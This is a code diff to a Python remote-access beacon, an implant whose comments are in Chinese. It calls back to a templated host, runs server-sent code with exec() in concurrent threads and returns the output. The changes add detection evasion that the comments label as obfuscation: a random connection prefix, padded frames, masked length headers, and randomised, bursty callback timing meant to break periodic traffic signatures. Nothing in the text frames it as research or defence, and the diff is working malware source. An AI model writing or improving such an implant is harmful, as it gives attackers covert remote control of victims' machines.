@@ -1,4 +1,4 @@
-import socket as sock, struct as st, zlib as zl, base64 as b64, random as rnd, time as tm, json as js, sys as sy, traceback as tb, io as io_, secrets as sec, threading as thr, hashlib as hl, hmac as hmac_
+import socket as sock, struct as st, zlib as zl, random as rnd, time as tm, json as js, sys as sy, traceback as tb, io as io_, secrets as sec, threading as thr, hashlib as hl, hmac as hmac_
 
 MASTER_KEY = bytes({{XOR_KEY_BYTES}})
 HOST = "{{HOST}}"
@@ -9,11 +9,28 @@ BEACON_ID = sec.token_hex(8)
 BREAK_FLAG = False
 CONN_KEY = MASTER_KEY
 
-# connect_transport 传输钩子（U2/T6.2）: uplevel 升级代码可覆盖 _T/_H/_P/_K
+# ── 模块短名契约(D2): 植入端模块(set_host/set_key/relay/fork/shell)与
+# uplevel 升级代码(transport_base)依赖这些全局名,勿改 ──
+_D = BEACON_ID            # 当前 beacon id
+_H = HOST                 # server 地址(set_host 模块修改,connect_transport 读取)
+_P = PORT                 # server 端口(set_host 模块修改,connect_transport 读取)
+_K = MASTER_KEY           # 部署密钥(set_key 模块修改)
+_CK = MASTER_KEY          # 当前连接密钥(uplevel _disp 按通道层切换;cycle 每轮 CONN_KEY=_CK)
+_B = BREAK_FLAG           # break 标志(主循环检查 _B)
+_I = INTERVAL             # 回连间隔(set_interval 模块修改,sleep_jitter 读取)
+_J = JITTER               # 回连抖动(set_interval 模块修改,sleep_jitter 读取)
+
+def _T():
+    """连接函数(uplevel 升级代码覆盖 _T 实现多级回退通道)。"""
+    return connect_transport()
+
+# connect_transport 传输钩子: uplevel 升级代码可覆盖 _T/_H/_P/_K
 def connect_transport():
     conn = sock.socket()
     conn.settimeout(30)
-    conn.connect((HOST, PORT))
+    conn.connect((_H, _P))
+    # 混淆: TCP 首包 256B 随机前缀(服务端 handshake 吞掉;HTTPS/DNS 变体不走此)
+    conn.sendall(sec.token_bytes(256))
     return conn
 
 def qround(state, x, y, z, w):
@@ -45,23 +62,33 @@ def xor_stream(data, key, nonce):
     return bytes(buf)
 
 def encode_frame_(data):
+    # 帧封装: zlib→ChaCha20→HMAC→帧尾 0-255B 随机 padding+1B pad_len(混淆长度分布)
     compressed = zl.compress(data)
     enc, mac_key = hl.sha256(b"e" + CONN_KEY).digest(), hl.sha256(b"m" + CONN_KEY).digest()
     nonce = sec.token_bytes(12)
     ciphertext = xor_stream(compressed, enc, nonce)
-    return b64.b64encode(nonce + ciphertext + hmac_.new(mac_key, nonce + ciphertext, hl.sha256).digest())
+    sealed = nonce + ciphertext + hmac_.new(mac_key, nonce + ciphertext, hl.sha256).digest()
+    pad_len = rnd.randint(0, 255)
+    return sealed + sec.token_bytes(pad_len) + bytes([pad_len])
 
 def decode_frame_(data):
-    blob = b64.b64decode(data)
+    pad_len = data[-1]
+    if len(data) < 12 + 32 + 1 + pad_len:
+        raise ValueError("bad frame")
+    sealed = data[: -1 - pad_len]
     enc, mac_key = hl.sha256(b"e" + CONN_KEY).digest(), hl.sha256(b"m" + CONN_KEY).digest()
-    nonce, ciphertext, tag = blob[:12], blob[12:-32], blob[-32:]
+    nonce, ciphertext, tag = sealed[:12], sealed[12:-32], sealed[-32:]
     if not hmac_.compare_digest(tag, hmac_.new(mac_key, nonce + ciphertext, hl.sha256).digest()):
         raise ValueError("MAC")
     return zl.decompress(xor_stream(ciphertext, enc, nonce))
 
+def _frame_mask():
+    """长度头掩码(与 server core/protocol.frame_mask 一致,固定值)。"""
+    return int.from_bytes(hl.sha256(CONN_KEY + b"len").digest()[:4], "big")
+
 def send_frame(conn, data):
     encoded = encode_frame_(data)
-    conn.sendall(st.pack(">I", len(encoded)) + encoded)
+    conn.sendall(st.pack(">I", len(encoded) ^ _frame_mask()) + encoded)
 
 def recv_frame(conn):
     header = b""
@@ -70,7 +97,7 @@ def recv_frame(conn):
         if not chunk:
             raise ConnectionError()
         header += chunk
-    length = st.unpack(">I", header)[0]
+    length = st.unpack(">I", header)[0] ^ _frame_mask()
     if length == 0:
         return b""
     payload = b""
@@ -81,41 +108,103 @@ def recv_frame(conn):
         payload += chunk
     return decode_frame_(payload)
 
-PRINT_LOCK = thr.Lock()
+# ── 批量任务模型(v2): 本地并发执行 + 结果暂存 + 回连上报 ──
+# 线程本地输出捕获: 多任务线程并发执行,print/sys.stdout 各进各的 buffer,
+# 互不污染(替代旧模型的全局重定向 + PRINT_LOCK 串行)。
+_TLS = thr.local()
+_TLS_MAX_OUT = 400000   # 单条结果安全截断(帧上限 512KB 的余量,防撑爆整批)
 
-def exec_task(code):
-    with PRINT_LOCK:
-        buffers = io_.StringIO(), io_.StringIO()
-        try:
-            sy.stdout, sy.stderr = buffers
-            exec(code, globals())
-            return buffers[0].getvalue(), buffers[1].getvalue()
-        except Exception:
-            return buffers[0].getvalue(), buffers[1].getvalue() + tb.format_exc()
-        finally:
-            sy.stdout, sy.stderr = sy.__stdout__, sy.__stderr__
+class _ThreadStream:
+    def __init__(self, kind):
+        self._kind = kind
+    def write(self, s):
+        buf = getattr(_TLS, "buf", None)
+        if buf is not None:
+            buf[0 if self._kind == "out" else 1].write(str(s))
+        else:
+            (sy.__stdout__ if self._kind == "out" else sy.__stderr__).write(str(s))
+    def flush(self):
+        pass
+
+sy.stdout = _ThreadStream("out")
+sy.stderr = _ThreadStream("err")
+
+_PENDING = {}        # task_id -> {"output": str, "error": str}(已完成、未获 ACK)
+_PENDING_LOCK = thr.Lock()
+_KNOWN = set()       # 已领取的 task_id(HTTPS/DNS 无状态通道可能重复下发,防重复执行)
+_KNOWN_LOCK = thr.Lock()
+
+def _run_one_task(task_id, code):
+    out_buf, err_buf = io_.StringIO(), io_.StringIO()
+    _TLS.buf = (out_buf, err_buf)
+    try:
+        exec(code, globals())
+    except Exception:
+        err_buf.write(tb.format_exc())
+    finally:
+        _TLS.buf = None
+    out, err = out_buf.getvalue(), err_buf.getvalue()
+    if len(out) > _TLS_MAX_OUT:
+        out = out[: _TLS_MAX_OUT] + "\n... (truncated, %d bytes total)" % len(out)
+    with _PENDING_LOCK:
+        _PENDING[task_id] = {"output": out, "error": err}
+
+def spawn_task(task_id, code):
+    if not task_id:
+        return
+    with _KNOWN_LOCK:
+        if task_id in _KNOWN:
+            return  # 已领取过(重复下发),跳过
+        _KNOWN.add(task_id)
+    thr.Thread(target=_run_one_task, args=(task_id, code), daemon=True).start()
+
+def _handle_tasks(msg):
+    """处理 TASKS 帧: acked 清理已确认结果 + tasks 去重领取。"""
+    for tid in msg.get("acked") or []:
+        with _PENDING_LOCK:
+            _PENDING.pop(tid, None)
+    for t in msg.get("tasks") or []:
+        spawn_task(t.get("task_id", ""), t.get("code", ""))
 
 def sleep_jitter():
-    return max(5, INTERVAL + rnd.uniform(-INTERVAL * JITTER, INTERVAL * JITTER))
+    # 回连间隔(混淆): [0.75I, 1.5I] 均匀随机,无最短下限(原 max(5,±) 有周期下界)
+    return rnd.uniform(_I * 0.75, _I * 1.5)
 
 def cycle():
     global CONN_KEY
-    CONN_KEY = MASTER_KEY
+    CONN_KEY = _CK   # 直连=_K(set_key 生效);uplevel 后=当前通道层密钥(_disp 设置)
     conn = None
     try:
-        conn = connect_transport()
-        send_frame(conn, js.dumps({"type": "register", "version": 1, "role": "beacon", "id": BEACON_ID}).encode())
+        conn = _T()
+        send_frame(conn, js.dumps({"type": "register", "version": 2, "role": "beacon", "id": BEACON_ID, "batch": True}).encode())
         while True:
             msg = js.loads(recv_frame(conn).decode())
             mtype = msg.get("type")
             if mtype == "welcome":
-                continue
-            if mtype in ("task", "init_task"):
-                out, err = exec_task(msg["code"])
-                send_frame(conn, js.dumps({"type": "result", "task_id": msg.get("task_id", ""), "output": out, "error": err}).encode())
-            elif mtype == "pong":
                 break
-            elif mtype == "error":
+            if mtype == "error":
+                return
+        # ① 上报已完成结果(逐条: 发一帧收一帧,收确认 + 顺带任务)
+        with _PENDING_LOCK:
+            pending = list(_PENDING.items())
+        for task_id, res in pending:
+            send_frame(conn, js.dumps({"type": "result", "task_id": task_id, "output": res["output"], "error": res["error"]}).encode())
+            msg = js.loads(recv_frame(conn).decode())
+            mtype = msg.get("type")
+            if mtype == "tasks":
+                _handle_tasks(msg)
+            elif mtype in ("pong", "error"):
+                return
+            else:
+                return
+        # ② 请求并领取全部待执行任务(TASKS 帧可能多批,直到 PONG 断开)
+        send_frame(conn, js.dumps({"type": "fetch"}).encode())
+        while True:
+            msg = js.loads(recv_frame(conn).decode())
+            mtype = msg.get("type")
+            if mtype == "tasks":
+                _handle_tasks(msg)
+            elif mtype in ("pong", "error"):
                 break
     except Exception:
         pass
@@ -126,8 +215,20 @@ def cycle():
             except Exception:
                 pass
 
+# 主循环(混淆时序): 30% 长间隔(跳 1-3 周期) + 30% 突发(1-3s 内连回),破坏周期性
+_burst_left = 0
 while True:
-    if BREAK_FLAG:
+    if _B:
         break
     cycle()
-    tm.sleep(sleep_jitter())
+    if _burst_left:
+        _burst_left -= 1
+        # 突发间隔 5-15s(原 1-3s 成簇短连特征太明显,拉长后仍短于主体间隔)
+        tm.sleep(rnd.uniform(5, 15))
+        continue
+    base = sleep_jitter()
+    if rnd.random() < 0.3:
+        base *= rnd.uniform(2, 4)
+    elif rnd.random() < 0.3:
+        _burst_left = rnd.randint(1, 2)
+    tm.sleep(base)
